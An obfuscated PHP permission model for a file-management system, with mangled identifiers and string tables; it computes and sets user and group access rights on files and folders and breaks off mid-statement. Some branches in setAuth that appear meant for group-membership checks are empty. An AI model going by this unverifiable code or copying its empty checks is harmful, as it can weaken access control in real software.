<?php
 goto F—‘„˜Îò·; fš§ŞÃİ´¹: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\145\137\141\x75\164\x68"; public function getAuth($áŠÚ”Å§) { $úµ½ïğ¹ =& $_SERVER[ˆûùúÊ¯]; $°Úò£‡ó = $this->sourceAuthSelect($áŠÚ”Å§); $æ¹ÓáÒˆ = array(); $˜óè‹€ô = array(); $Æ “ûÜ± = 2 << 25; foreach ($°Úò£‡ó as $µÈÄ„Âæ) { $ŠÂÆ¢õ = Model($úµ½ïğ¹[548])->listData($µÈÄ„Âæ[$úµ½ïğ¹[2000]]); if (!$ŠÂÆ¢õ) { continue; } $æ¹ÓáÒˆ[] = $µÈÄ„Âæ; $¯»Ó®§ò = 0; if ($µÈÄ„Âæ[$úµ½ïğ¹[187]] == SourceModel::TYPE_GROUP) { $¯»Ó®§ò = $Æ “ûÜ± * 2; } if ($µÈÄ„Âæ[$úµ½ïğ¹[187]] == SourceModel::TYPE_USER) { $¯»Ó®§ò = $Æ “ûÜ±; } if ($µÈÄ„Âæ[$úµ½ïğ¹[187]] == SourceModel::TYPE_USER && $µÈÄ„Âæ[$úµ½ïğ¹[546]] == $úµ½ïğ¹[221]) { $¯»Ó®§ò = 0; } $˜óè‹€ô[] = $ŠÂÆ¢õ[$úµ½ïğ¹[463]] + $¯»Ó®§ò; } array_multisort($˜óè‹€ô, SORT_DESC, $æ¹ÓáÒˆ); return $æ¹ÓáÒˆ; } public function sourceAuthSelect($©í…ş¤) { $‚™ÎğØ¡ =& $_SERVER[ˆûùúÊ¯]; static $‰÷è¥æè = array(); $Õ‘Š”²À = is_array($©í…ş¤) ? !1 : !0; if ($Õ‘Š”²À) { $©í…ş¤ = array($©í…ş¤); } $±§šşõ° = array(); foreach ($©í…ş¤ as $ÅşéÂ»³) { if (isset($‰÷è¥æè[$ÅşéÂ»³])) { $±§šşõ°[$ÅşéÂ»³] = $‰÷è¥æè[$ÅşéÂ»³]; } } if (count($±§šşõ°) == count($©í…ş¤)) { return $Õ‘Š”²À ? $±§šşõ°[$©í…ş¤[0]] : $±§šşõ°; } $ˆìŠ‹¸³ = $‚™ÎğØ¡[2077]; $ìêíÀı° = array($‚™ÎğØ¡[190] => array($‚™ÎğØ¡[7], $©í…ş¤)); $ƒÃ†İ›» = $this->field($ˆìŠ‹¸³)->order($‚™ÎğØ¡[451])->where($ìêíÀı°)->select(); $´½†ÈÙù = array_to_keyvalue_group($ƒÃ†İ›», $‚™ÎğØ¡[190]); foreach ($©í…ş¤ as $ÅşéÂ»³) { $‰÷è¥æè[$ÅşéÂ»³] = $´½†ÈÙù[$ÅşéÂ»³] ? $´½†ÈÙù[$ÅşéÂ»³] : array(); } if ($Õ‘Š”²À) { return $ƒÃ†İ›»; } return $´½†ÈÙù; } public function setAuth($˜­Ä¹Şé, $½ù×õÔ) { $Ä‘úë¥ =& $_SERVER[ˆûùúÊ¯]; $ËÜøÒãâ = Model($Ä‘úë¥[1393])->sourceInfo($˜­Ä¹Şé); if (!$ËÜøÒãâ) { return !1; } if ($ËÜøÒãâ[$Ä‘úë¥[187]] != SourceModel::TYPE_GROUP) { return !1; } $«Ê®Íë¼ = 1; $®Éæ¼È = $ËÜøÒãâ[$Ä‘úë¥[546]]; if ($®Éæ¼È != $«Ê®Íë¼) { $¿²Ø¬Â† = array($Ä‘úë¥[1896] => $®Éæ¼È); $³å­ú˜± = Model($Ä‘úë¥[1986])->field($Ä‘úë¥[1704])->where($¿²Ø¬Â†)->select(); $³å­ú˜± = array_to_keyvalue($³å­ú˜±, $Ä‘úë¥[12], $Ä‘úë¥[1704]); } $™ó¢¹ÙÉ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $œØî›¥” = array(); foreach ($½ù×õÔ as $ô’¼ Ë) { if (!in_array($ô’¼ Ë[$Ä‘úë¥[187]], $™ó¢¹ÙÉ)) { show_json(LNG($Ä‘úë¥[2078]), !1); } if ($®Éæ¼È != $«Ê®Íë¼) { if ($ô’¼ Ë[$Ä‘úë¥[187]] == SourceModel::TYPE_GROUP) { } if ($ô’¼ Ë[$Ä‘úë¥[546]] != 0 && !in_array($ô’¼ Ë[$Ä‘úë¥[546]], $³å­ú˜±)) { } } if ($ô’¼ Ë[$Ä‘úë¥[546]] == 0) { $ô’¼ Ë[$Ä‘úë¥[187]] = SourceModel::TYPE_USER; } $œØî›¥”[] = array($Ä‘úë¥[190] => $˜­Ä¹Şé, $Ä‘úë¥[187] => intval($ô’¼ Ë[$Ä‘úë¥[187]]), $Ä‘úë¥[546] => intval($ô’¼ Ë[$Ä‘úë¥[546]]), $Ä‘úë¥[2000] => intval($ô’¼ Ë[$Ä‘úë¥[2000]]) ? intval($ô’¼ Ë[$Ä‘úë¥[2000]]) : 0, $Ä‘úë¥[2060] => intval($ô’¼ Ë[$Ä‘úë¥[2060]]) ? intval($ô’¼ Ë[$Ä‘úë¥[2060]]) : -1); } $this->where(array($Ä‘úë¥[467] => $˜­Ä¹Şé))->delete(); $this->addAll($œØî›¥”); return !0; } public function authClear($ŞêåğÚ) { $—…–¬¾ê =& $_SERVER[ˆûùúÊ¯]; $„ä¢òÇ = Model($—…–¬¾ê[1393])->sourceInfo($ŞêåğÚ); $İÊºÀÌÊ = array($ŞêåğÚ); if ($„ä¢òÇ[$—…–¬¾ê[461]] == $—…–¬¾ê[98]) { $Ê¬ßìÉ = array($—…–¬¾ê[628] => array($—…–¬¾ê[588], $„ä¢òÇ[$—…–¬¾ê[561]] . $ŞêåğÚ . $—…–¬¾ê[589])); $İÊºÀÌÊ = Model($—…–¬¾ê[1393])->field($—…–¬¾ê[467])->where($Ê¬ßìÉ)->getField($—…–¬¾ê[190], !0); $İÊºÀÌÊ[] = $ŞêåğÚ; } $this->where(array($—…–¬¾ê[467] => array($—…–¬¾ê[468], $İÊºÀÌÊ)))->delete(); return !0; } public function getAllChildren($–šÅ—¨®) { $ÏíĞÄ¬˜ =& $_SERVER[ˆûùúÊ¯]; $øªÒÜ‚ = Model($ÏíĞÄ¬˜[1393])->sourceInfo($–šÅ—¨®); if ($øªÒÜ‚[$ÏíĞÄ¬˜[461]] != $ÏíĞÄ¬˜[98]) { return $this->sourceListAuth(array($–šÅ—¨®)); } if ($øªÒÜ‚[$ÏíĞÄ¬˜[187]] != SourceModel::TYPE_GROUP) { return array(); } $òúÇÅËã = 1; $ŞĞë‘¹ = array($–šÅ—¨®); if ($øªÒÜ‚[$ÏíĞÄ¬˜[189]] == $ÏíĞÄ¬˜[221] && $øªÒÜ‚[$ÏíĞÄ¬˜[546]] != $òúÇÅËã) { $ŞĞë‘¹ = $this->groupChidldAllRootSource($øªÒÜ‚[$ÏíĞÄ¬˜[546]]); } $¦‰ˆú¶ş = $this->field($ÏíĞÄ¬˜[190])->group($ÏíĞÄ¬˜[190])->select(); $¦‰ˆú¶ş = array_to_keyvalue($¦‰ˆú¶ş, $ÏíĞÄ¬˜[12], $ÏíĞÄ¬˜[190]); if (!$¦‰ˆú¶ş) { return array(); } $Ô‹íÜ¢ = $ÏíĞÄ¬˜[2079]; $§Ûë´áù = array($ÏíĞÄ¬˜[190] => array($ÏíĞÄ¬˜[7], $¦‰ˆú¶ş), $ÏíĞÄ¬˜[481] => $ÏíĞÄ¬˜[221]); $Ú‹şìœ = Model($ÏíĞÄ¬˜[885])->field($Ô‹íÜ¢)->where($§Ûë´áù)->select(); $ı¡œ´°” = array($–šÅ—¨®); foreach ($Ú‹şìœ as $ìÁøåæ) { foreach ($ŞĞë‘¹ as $†óÉ¥Ñ“) { $Ê½”şç‘ = $ÏíĞÄ¬˜[60] . $†óÉ¥Ñ“ . $ÏíĞÄ¬˜[60]; $ª‹Ò˜Úà = $ìÁøåæ[$ÏíĞÄ¬˜[561]] . $ìÁøåæ[$ÏíĞÄ¬˜[190]] . $ÏíĞÄ¬˜[60]; if (strstr($ª‹Ò˜Úà, $Ê½”şç‘)) { $ı¡œ´°”[] = $ìÁøåæ[$ÏíĞÄ¬˜[190]]; break; } } } return $this->sourceListAuth($ı¡œ´°”); } private function sourceListAuth($íˆ§İİæ) { $¾‘¢¬– =& $_SERVER[ˆûùúÊ¯]; $±±Øî£ = Model($¾‘¢¬–[1393])->sourceListInfo($íˆ§İİæ, !0); $ğëÖèî = $this->sourceAuthSelect($íˆ§İİæ); $’Ú¨òŸ = array(); $¡ƒˆœ×¡ = array(); foreach ($±±Øî£ as $ÇŒ’ó¥é) { unset($ÇŒ’ó¥é[$¾‘¢¬–[505]]); unset($ÇŒ’ó¥é[$¾‘¢¬–[503]]); unset($ÇŒ’ó¥é[$¾‘¢¬–[463]]); unset($ÇŒ’ó¥é[$¾‘¢¬–[97]]); $¨Ÿğ±€— = $ğëÖèî[$ÇŒ’ó¥é[$¾‘¢¬–[190]]]; if (!$¨Ÿğ±€—) { continue; } $ÇŒ’ó¥é[$¾‘¢¬–[2080]] = $this->authTargetInfo($¨Ÿğ±€—); $ÇŒ’ó¥é[$¾‘¢¬–[559]] = rtrim($ÇŒ’ó¥é[$¾‘¢¬–[565]], $¾‘¢¬–[8]) . $¾‘¢¬–[8] . ltrim($ÇŒ’ó¥é[$¾‘¢¬–[559]], $¾‘¢¬–[8]); $’Ú¨òŸ[] = $ÇŒ’ó¥é; $ˆ‚«ú™ = count(explode($¾‘¢¬–[8], trim($ÇŒ’ó¥é[$¾‘¢¬–[559]], $¾‘¢¬–[8]))); $¡ƒˆœ×¡[] = $ˆ‚«ú™ + ($ÇŒ’ó¥é[$¾‘¢¬–[43]] == $¾‘¢¬–[85] ? 0 : 1000); } array_multisort($¡ƒˆœ×¡, SORT_ASC, $’Ú¨òŸ); return $’Ú¨òŸ; } private function groupChidldAllRootSource($‡È ôí) { $ïå¬…‚ =& $_SERVER[ˆûùúÊ¯]; $‡ˆî§Ğô = Model($ïå¬…‚[2081])->groupChildrenAll($‡È ôí); $šùûî¥£ = array($ïå¬…‚[189] => 0, $ïå¬…‚[546] => array($ïå¬…‚[7], $‡ˆî§Ğô), $ïå¬…‚[187] => SourceModel::TYPE_GROUP); $²‹«åÅì = Model($ïå¬…‚[885])->field($ïå¬…‚[190])->where($šùûî¥£)->select(); $²‹«åÅì = array_to_keyvalue($²‹«åÅì, $ïå¬…‚[12], $ïå¬…‚[190]); return $²‹«åÅì; } private function authTargetInfo($ËÆœ¨—†) { $ƒÑûâğ =& $_SERVER[ˆûùúÊ¯]; $°Éú–€Ÿ = array(); $‡ş´³ëú = array(); $õ¿Èä“ö = 2 << 25; foreach ($ËÆœ¨—† as $Œ¼©Ç “) { $¦ç¯æ·Æ = Model($ƒÑûâğ[548])->listData($Œ¼©Ç “[$ƒÑûâğ[2000]]); if (!$¦ç¯æ·Æ) { continue; } if ($Œ¼©Ç “[$ƒÑûâğ[187]] == SourceModel::TYPE_USER) { $Ì÷›èÎŠ = Model($ƒÑûâğ[554])->getInfoSimpleOuter($Œ¼©Ç “[$ƒÑûâğ[546]]); if ($Ì÷›èÎŠ[$ƒÑûâğ[1704]] == $ƒÑûâğ[1249]) { continue; } if ($Ì÷›èÎŠ[$ƒÑûâğ[1704]] == $ƒÑûâğ[221]) { $Ì÷›èÎŠ[$ƒÑûâğ[42]] = LNG($ƒÑûâğ[2082]); } } else { $Ì÷›èÎŠ = Model($ƒÑûâğ[562])->getInfoSimple($Œ¼©Ç “[$ƒÑûâğ[546]]); } if (!$Ì÷›èÎŠ) { continue; } $Ì÷›èÎŠ[$ƒÑûâğ[516]] = $¦ç¯æ·Æ; $°Éú–€Ÿ[] = $Ì÷›èÎŠ; $ÜşìıéÀ = 0; if ($Œ¼©Ç “[$ƒÑûâğ[187]] == SourceModel::TYPE_GROUP) { $ÜşìıéÀ = $õ¿Èä“ö * 2; } if ($Œ¼©Ç “[$ƒÑûâğ[187]] == SourceModel::TYPE_USER) { $ÜşìıéÀ = $õ¿Èä“ö; } if ($Œ¼©Ç “[$ƒÑûâğ[187]] == SourceModel::TYPE_USER && $Œ¼©Ç “[$ƒÑûâğ[546]] == $ƒÑûâğ[221]) { $ÜşìıéÀ = 0; } $‡ş´³ëú[] = $¦ç¯æ·Æ[$ƒÑûâğ[463]] + $ÜşìıéÀ; } array_multisort($‡ş´³ëú, SORT_DESC, $°Éú–€Ÿ); return $°Éú–€Ÿ; } public function getAllChildrenByUser($©‹ø´›ì, $ÛÙ‘Ø‹) { $·™ÊÅ®Ø =& $_SERVER[ˆûùúÊ¯]; $Òšø‹÷Ç = Model($·™ÊÅ®Ø[575])->getInfo($ÛÙ‘Ø‹); if (!$ÛÙ‘Ø‹ || !$©‹ø´›ì || !$Òšø‹÷Ç) { return array(); } $‰ªÍâÆµ = Model($·™ÊÅ®Ø[1393])->sourceInfo($©‹ø´›ì); $À«˜¸í¯ = array(); $ùšÃÒèâ = 1; if ($‰ªÍâÆµ[$·™ÊÅ®Ø[189]] == $·™ÊÅ®Ø[221] && $‰ªÍâÆµ[$·™ÊÅ®Ø[546]] != $ùšÃÒèâ && $this->groupContainUser($‰ªÍâÆµ[$·™ÊÅ®Ø[546]], $ÛÙ‘Ø‹)) { foreach ($Òšø‹÷Ç[$·™ÊÅ®Ø[2083]] as $‚®¦ÁÛÖ) { $ûúıª¡ì = Model($·™ÊÅ®Ø[562])->getInfo($‚®¦ÁÛÖ[$·™ÊÅ®Ø[1896]]); $ƒîÔ”ï = Model($·™ÊÅ®Ø[575])->getInfoSimpleOuter($ÛÙ‘Ø‹); $ƒîÔ”ï[$·™ÊÅ®Ø[516]] = $‚®¦ÁÛÖ[$·™ÊÅ®Ø[463]]; if (Model($·™ÊÅ®Ø[548])->authCheckAction($‚®¦ÁÛÖ[$·™ÊÅ®Ø[463]][$·™ÊÅ®Ø[463]], $·™ÊÅ®Ø[1917])) { continue; } $±çòš¯ = array($·™ÊÅ®Ø[42] => $·™ÊÅ®Ø[1269] . $ûúıª¡ì[$·™ÊÅ®Ø[42]], $·™ÊÅ®Ø[190] => $ûúıª¡ì[$·™ÊÅ®Ø[97]][$·™ÊÅ®Ø[190]], $·™ÊÅ®Ø[94] => KodIO::make($ûúıª¡ì[$·™ÊÅ®Ø[97]][$·™ÊÅ®Ø[190]]), $·™ÊÅ®Ø[189] => $·™ÊÅ®Ø[221], $·™ÊÅ®Ø[187] => $·™ÊÅ®Ø[555], $·™ÊÅ®Ø[43] => $·™ÊÅ®Ø[592], $·™ÊÅ®Ø[559] => $ûúıª¡ì[$·™ÊÅ®Ø[566]], $·™ÊÅ®Ø[1896] => $ûúıª¡ì[$·™ÊÅ®Ø[1896]], $·™ÊÅ®Ø[563] => $ûúıª¡ì[$·™ÊÅ®Ø[189]], $·™ÊÅ®Ø[2080] => array($ƒîÔ”ï)); $À«˜¸í¯[$±çòš¯[$·™ÊÅ®Ø[190]]] = $±çòš¯; } } $·ã¨…úÃ = array(); $ºØëŸ”ø = $this->getAllChildren($©‹ø´›ì); foreach ($ºØëŸ”ø as $ÏÉÜ£) { $¹à…ı‹û = !1; foreach ($ÏÉÜ£[$·™ÊÅ®Ø[2080]] as $Ö†Íü°ö) { if ($Ö†Íü°ö[$·™ÊÅ®Ø[1704]]) { if ($Ö†Íü°ö[$·™ÊÅ®Ø[1704]] == $ÛÙ‘Ø‹) { $¹à…ı‹û = !0; break; } } if ($Ö†Íü°ö[$·™ÊÅ®Ø[1896]]) { if ($this->groupContainUser($Ö†Íü°ö[$·™ÊÅ®Ø[1896]], $ÛÙ‘Ø‹)) { $¹à…ı‹û = !0; break; } } } if ($¹à…ı‹û) { $·ã¨…úÃ[] = $ÏÉÜ£; } $´ùß§¯Ü = $ÏÉÜ£[$·™ÊÅ®Ø[190]]; if (isset($À«˜¸í¯[$´ùß§¯Ü])) { $ÏÉÜ£[$·™ÊÅ®Ø[2080]][] = $À«˜¸í¯[$´ùß§¯Ü][0]; $À«˜¸í¯[$´ùß§¯Ü] = !1; } } $À«˜¸í¯ = array_filter(array_values($À«˜¸í¯)); $·ã¨…úÃ = array_merge($À«˜¸í¯, $·ã¨…úÃ); return $·ã¨…úÃ; } public function setAllChildrenByUser($©†ˆö§ñ, $·ç¬Œ´ï, $‘’¦±±Ö) { $¿±³£ñ =& $_SERVER[ˆûùúÊ¯]; $‘‹şÌÏÁ = $this->getAllChildrenByUser($©†ˆö§ñ, $·ç¬Œ´ï); if (!$‘’¦±±Ö || !$‘‹şÌÏÁ) { return !1; } foreach ($‘‹şÌÏÁ as $¨™Ë†”ª) { $Ü¹µÓ«ö = array(); foreach ($¨™Ë†”ª[$¿±³£ñ[2080]] as $ç¬ÊŠŒ) { $ãÀò¯¹° = $ç¬ÊŠŒ[$¿±³£ñ[516]]; $ôÓºˆ³… = $ç¬ÊŠŒ[$¿±³£ñ[1704]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ß³™Õ£à = $ç¬ÊŠŒ[$¿±³£ñ[1704]] ? $ç¬ÊŠŒ[$¿±³£ñ[1704]] : $ç¬ÊŠŒ[$¿±³£ñ[1896]]; if ($ç¬ÊŠŒ[$¿±³£ñ[1704]] && $ç¬ÊŠŒ[$¿±³£ñ[1704]] == $·ç¬Œ´ï) { continue; } $Ü¹µÓ«ö[] = array($¿±³£ñ[190] => $¨™Ë†”ª[$¿±³£ñ[190]], $¿±³£ñ[187] => $ôÓºˆ³…, $¿±³£ñ[546] => intval($ß³™Õ£à), $¿±³£ñ[2000] => isset($ãÀò¯¹°[$¿±³£ñ[451]]) ? intval($ãÀò¯¹°[$¿±³£ñ[451]]) : 0, $¿±³£ñ[2060] => isset($ãÀò¯¹°[$¿±³£ñ[2060]]) ? intval($ãÀò¯¹°[$¿±³£ñ[2060]]) : -1); } $Ü¹µÓ«ö[] = array($¿±³£ñ[190] => $¨™Ë†”ª[$¿±³£ñ[190]], $¿±³£ñ[187] => SourceModel::TYPE_USER, $¿±³£ñ[546] => intval($·ç¬Œ´ï), $¿±³£ñ[2000] => intval($‘’¦±±Ö), $¿±³£ñ[2060] => -1); $this->where(array($¿±³£ñ[467] => $¨™Ë†”ª[$¿±³£ñ[190]]))->delete(); $this->addAll($Ü¹µÓ«ö); } return !0; } public function get($ˆÌ“ÒÊ„) { $ò²¢Øâ = $this->getSourceList(array($ˆÌ“ÒÊ„), !0); return $ò²¢Øâ[0]; } public function getSourceList($¦ìÆ‘Îæ, $Ä€³€àğ = false, $Ï³Øı‚ = false) { $°ê«Û¤å =& $_SERVER[ˆûùúÊ¯]; if (!$¦ìÆ‘Îæ) { return array(); } $–ğÏù”¼ = Model($°ê«Û¤å[1393]); if (!$Ä€³€àğ && count($¦ìÆ‘Îæ) == 1) { $Ä€³€àğ = array(); $Ä€³€àğ[$¦ìÆ‘Îæ[0]] = $–ğÏù”¼->sourceInfo($¦ìÆ‘Îæ[0]); } if (!$Ä€³€àğ) { $„ªÙŒÌÁ = array($°ê«Û¤å[467] => array($°ê«Û¤å[468], $¦ìÆ‘Îæ)); $Ä€³€àğ = $–ğÏù”¼->field($°ê«Û¤å[2084])->where($„ªÙŒÌÁ)->select(); $Ä€³€àğ = array_to_keyvalue($Ä€³€àğ, $°ê«Û¤å[190]); } $øÔ‘÷•Â = $¦ìÆ‘Îæ; foreach ($Ä€³€àğ as $¢¿½Æ± => $£ë‚»Ä) { $è•îù›õ = $–ğÏù”¼->parentLevelArray($£ë‚»Ä[$°ê«Û¤å[561]]); $øÔ‘÷•Â = array_merge($øÔ‘÷•Â, array($¢¿½Æ±), array_reverse($è•îù›õ)); } $øÔ‘÷•Â = array_values(array_unique($øÔ‘÷•Â)); if (!$øÔ‘÷•Â) { return array(); } $¼º…ò«Œ = $this->sourceAuthSelect($øÔ‘÷•Â); $™ÄØ¡Ë = array(); foreach ($øÔ‘÷•Â as $¯…­÷Áó) { if (isset($¼º…ò«Œ[$¯…­÷Áó])) { $™ÄØ¡Ë[$¯…­÷Áó] = $¼º…ò«Œ[$¯…­÷Áó]; } } $ò•²É³ª = $this->userIsRoot($Ï³Øı‚); $¶ÂËœ­ = AuthModel::authAll(); $†™¯£öõ = array($°ê«Û¤å[464] => $¶ÂËœ­, $°ê«Û¤å[2085] => array($°ê«Û¤å[469] => 0, $°ê«Û¤å[1902] => $¶ÂËœ­, $°ê«Û¤å[470] => LNG($°ê«Û¤å[2086]), $°ê«Û¤å[1919] => $°ê«Û¤å[2087])); $Íí¢ã…Æ = array(); foreach ($Ä€³€àğ as $¯…­÷Áó => $¹×şÎÖ“) { if ($ò•²É³ª && $GLOBALS[$°ê«Û¤å[6]][$°ê«Û¤å[1915]]) { $Íí¢ã…Æ[$¯…­÷Áó] = $†™¯£öõ; continue; } $Íí¢ã…Æ[$¯…­÷Áó] = $this->makeSourceAuth($¹×şÎÖ“, $™ÄØ¡Ë, $Ï³Øı‚); } return $Íí¢ã…Æ; } public function authDeepCheck($¾ÅüÔÑé, $¶ÉÙıæ = false) { $èğ»õ† =& $_SERVER[ˆûùúÊ¯]; $¶ÉÙıæ = $¶ÉÙıæ ? $¶ÉÙıæ : USER_ID; $¡…È¨¾ç = $this->makeAuthDeep($¶ÉÙıæ); if (!in_array($¾ÅüÔÑé, $¡…È¨¾ç[$èğ»õ†[2088]])) { return !1; } $™œÄ‰Áó = array(); foreach ($¡…È¨¾ç[$èğ»õ†[2089]] as $¯åøåİÆ => $öÉä§µş) { if (!in_array($¾ÅüÔÑé, $öÉä§µş)) { continue; } $™œÄ‰Áó[] = $¯åøåİÆ; } if (!$™œÄ‰Áó) { return !1; } $ÚÅšîùí = $™œÄ‰Áó ? $™œÄ‰Áó[0] : $¾ÅüÔÑé; return array($èğ»õ†[464] => -1, $èğ»õ†[516] => array($èğ»õ†[469] => $èğ»õ†[1249], $èğ»õ†[1902] => $èğ»õ†[221], $èğ»õ†[470] => LNG($èğ»õ†[2090]), $èğ»õ†[1919] => $èğ»õ†[2091]), $èğ»õ†[2092] => LNG($èğ»õ†[2093]), $èğ»õ†[2094] => $this->sourceAuthInfo($ÚÅšîùí)); } protected function makeAuthDeep($¦ªÃÔÑ = false) { $°Ë°‡˜ =& $_SERVER[ˆûùúÊ¯]; static $À¨ÇÁ¢” = array(); $¦ªÃÔÑ = $¦ªÃÔÑ ? $¦ªÃÔÑ : USER_ID; if (isset($À¨ÇÁ¢”[$¦ªÃÔÑ])) { return $À¨ÇÁ¢”[$¦ªÃÔÑ]; } $Ó¡õÜ¹Ì = Model($°Ë°‡˜[2095])->listData(); $ïÚ°šÍï = array(); foreach ($Ó¡õÜ¹Ì as $´áô²ˆÖ) { if ($´áô²ˆÖ[$°Ë°‡˜[463]] == 0 && $´áô²ˆÖ[$°Ë°‡˜[1918]] == $°Ë°‡˜[98]) { $ïÚ°šÍï[] = $´áô²ˆÖ[$°Ë°‡˜[451]]; } } $¡ÊÃûÊÏ = $this->userGroupParents($¦ªÃÔÑ); $öšáÅ‹Å = array($°Ë°‡˜[187] => SourceModel::TYPE_USER, $°Ë°‡˜[546] => $¦ªÃÔÑ); if ($¡ÊÃûÊÏ) { $öšáÅ‹Å = array(array($°Ë°‡˜[187] => SourceModel::TYPE_USER, $°Ë°‡˜[546] => $¦ªÃÔÑ), array($°Ë°‡˜[187] => SourceModel::TYPE_GROUP, $°Ë°‡˜[546] => array($°Ë°‡˜[468], $¡ÊÃûÊÏ)), $°Ë°‡˜[1061] => $°Ë°‡˜[1994]); } $¨âˆø‰à = $this->field($°Ë°‡˜[2096])->where($öšáÅ‹Å)->select(); $ÕÁõô¸Á = array(); $Ş¿ªÁù = array_to_keyvalue_group($¨âˆø‰à, $°Ë°‡˜[190]); foreach ($Ş¿ªÁù as $Î„‹Ÿ± => $ĞšÂúÆÒ) { $—Û¼üˆÀ = $this->authArrayCheck($ĞšÂúÆÒ, $¦ªÃÔÑ); if ($—Û¼üˆÀ[$°Ë°‡˜[464]] > 0) { $ÕÁõô¸Á[] = $Î„‹Ÿ± . $°Ë°‡˜[12]; } } if ($¡ÊÃûÊÏ) { $Ôšæ×ñ = Model($°Ë°‡˜[562]); foreach ($¡ÊÃûÊÏ as $˜Èî«Â) { $¦õêÙÔå = $Ôšæ×ñ->getInfo($˜Èî«Â); if (!$¦õêÙÔå || !is_array($¦õêÙÔå[$°Ë°‡˜[97]])) { continue; } $ÕÁõô¸Á[] = $¦õêÙÔå[$°Ë°‡˜[97]][$°Ë°‡˜[190]]; } } $ÃÏÉ…• = array(); $ş”Ó›’’ = $¡ÊÃûÊÏ; $Öı¿şÆú = Model($°Ë°‡˜[1393]); $Ôšæ×ñ = Model($°Ë°‡˜[562]); $×‚¿‹Å­ = array(); $¸Š×£ŒŸ = array(); $Ê¾­È¸¾ = array(); $†×ëöö = array(); if ($ÕÁõô¸Á) { $åÏŸÀÕ™ = $Öı¿şÆú->where(array($°Ë°‡˜[190] => array($°Ë°‡˜[468], $ÕÁõô¸Á)))->select(); foreach ($åÏŸÀÕ™ as $Şã¥ğ¸) { $É÷óşÍ— = $Öı¿şÆú->parentLevelArray($Şã¥ğ¸[$°Ë°‡˜[561]]); $ÃÏÉ…• = array_merge($ÃÏÉ…•, $É÷óşÍ—); $ş”Ó›’’[] = $Şã¥ğ¸[$°Ë°‡˜[546]]; $×‚¿‹Å­[$Şã¥ğ¸[$°Ë°‡˜[190]]] = $É÷óşÍ—; $¸Š×£ŒŸ[$Şã¥ğ¸[$°Ë°‡˜[190]]] = $Şã¥ğ¸[$°Ë°‡˜[546]]; } } $ş”Ó›’’ = array_values(array_unique($ş”Ó›’’)); $ƒŞôØŠî = $ş”Ó›’’; foreach ($ƒŞôØŠî as $˜Èî«Â) { $¦õêÙÔå = $Ôšæ×ñ->getInfo($˜Èî«Â); $É÷óşÍ— = $Öı¿şÆú->parentLevelArray($¦õêÙÔå[$°Ë°‡˜[561]]); $ş”Ó›’’ = array_merge($ş”Ó›’’, $É÷óşÍ—); } $ş”Ó›’’ = array_values(array_unique($ş”Ó›’’)); foreach ($ş”Ó›’’ as $˜Èî«Â) { $¦õêÙÔå = $Ôšæ×ñ->getInfo($˜Èî«Â); $ÃÏÉ…•[] = $¦õêÙÔå[$°Ë°‡˜[97]][$°Ë°‡˜[190]]; $Ê¾­È¸¾[$˜Èî«Â] = $¦õêÙÔå[$°Ë°‡˜[97]][$°Ë°‡˜[190]]; $†×ëöö[$˜Èî«Â] = $Öı¿şÆú->parentLevelArray($¦õêÙÔå[$°Ë°‡˜[561]]); } foreach ($×‚¿‹Å­ as $®öäò§ => $™™·Ÿ¬’) { $¨ºŒİ¹Å = $¸Š×£ŒŸ[$®öäò§]; if (!$¨ºŒİ¹Å || !$Ê¾­È¸¾[$¨ºŒİ¹Å]) { continue; } $º·ˆ‹Ê = array(); foreach ($†×ëöö[$¨ºŒİ¹Å] as $˜Èî«Â) { $º·ˆ‹Ê[] = $Ê¾­È¸¾[$˜Èî«Â]; } $×‚¿‹Å­[$®öäò§] = array_merge($º·ˆ‹Ê, $™™·Ÿ¬’); } $ÃÏÉ…• = array_values(array_unique($ÃÏÉ…•)); $¶´ö„ = array($°Ë°‡˜[2088] => $ÃÏÉ…•, $°Ë°‡˜[2089] => $×‚¿‹Å­); $À¨ÇÁ¢”[$¦ªÃÔÑ] = $¶´ö„; return $¶´ö„; } private function makeSourceAuth($¦É•¯¹Ü, $Áúèö€®, $Æ¥†˜šˆ = false) { $äÑŒÈ¨± =& $_SERVER[ˆûùúÊ¯]; $¼®Ö¸ä¾ = $äÑŒÈ¨±[98]; $ì½†ìˆã = $¦É•¯¹Ü[$äÑŒÈ¨±[546]]; $©Â•Ù¾ = $¦É•¯¹Ü[$äÑŒÈ¨±[187]] == SourceModel::TYPE_GROUP; $ïá¨øƒù = $©Â•Ù¾ ? $this->groupRootAuth($ì½†ìˆã, $Æ¥†˜šˆ) : !1; if ($ïá¨øƒù && Model($äÑŒÈ¨±[548])->authCheckAction($ïá¨øƒù[$äÑŒÈ¨±[463]], $äÑŒÈ¨±[1917])) { return $this->groupAuthInfo($ïá¨øƒù, $ì½†ìˆã); } $ÍÊĞ”‘© = Model($äÑŒÈ¨±[1393])->parentLevelArray($¦É•¯¹Ü[$äÑŒÈ¨±[561]]); $ÍÊĞ”‘© = array_merge(array($¦É•¯¹Ü[$äÑŒÈ¨±[190]]), array_reverse($ÍÊĞ”‘©)); $÷±óâ˜ö = !1; foreach ($ÍÊĞ”‘© as $ÕøÔìÙï) { if (!isset($Áúèö€®[$ÕøÔìÙï])) { continue; } $Âå²ßÔ = $this->authMake($Áúèö€®[$ÕøÔìÙï], $Æ¥†˜šˆ); if ($Âå²ßÔ[$äÑŒÈ¨±[516]]) { $÷±óâ˜ö = $Âå²ßÔ; break; } } if (!$©Â•Ù¾) { return $÷±óâ˜ö; } if (!$÷±óâ˜ö && $ïá¨øƒù) { $÷±óâ˜ö = $this->groupAuthInfo($ïá¨øƒù, $ì½†ìˆã); } if (!$÷±óâ˜ö) { $‡Ğá´úÁ = Model($äÑŒÈ¨±[562])->getInfo($ì½†ìˆã); $ÎîïÕ‰ = explode($äÑŒÈ¨±[60], trim($‡Ğá´úÁ[$äÑŒÈ¨±[561]], $äÑŒÈ¨±[60])); $ÎîïÕ‰ = array_reverse($ÎîïÕ‰); foreach ($ÎîïÕ‰ as $Ù”ó©ãæ) { if ($Ù”ó©ãæ == $äÑŒÈ¨±[221] || $Ù”ó©ãæ == $¼®Ö¸ä¾) { continue; } $¹á™—“ = $this->groupRootAuth($Ù”ó©ãæ, $Æ¥†˜šˆ); if (!$¹á™—“) { continue; } $÷±óâ˜ö = $this->groupAuthInfo($¹á™—“, $Ù”ó©ãæ); break; } } if (!$÷±óâ˜ö || $÷±óâ˜ö[$äÑŒÈ¨±[464]] <= 0) { $ï„ ¹§ù = 